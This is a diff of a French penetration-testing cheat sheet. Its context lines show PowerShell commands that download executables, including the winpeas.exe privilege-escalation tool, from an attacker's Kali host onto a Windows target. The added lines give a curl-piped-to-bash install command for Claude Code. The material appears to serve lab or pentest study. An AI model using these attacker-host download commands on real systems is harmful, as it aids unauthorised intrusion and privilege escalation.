@@ -60,6 +60,11 @@ Invoke-WebRequest -Uri http://[IP_KALI]:8080/[fichier.exe] -OutFile C:\Temp\[fic
 Invoke-WebRequest -Uri http://10.10.10.10:8080/winpeas.exe -OutFile C:\Temp\winpeas.exe
 ```
 
+** Utilisation IA **
+```text
+Claude Code : curl -fsSL https://claude.ai/install.sh | bash
+```
+
 ---
 
 ## Références
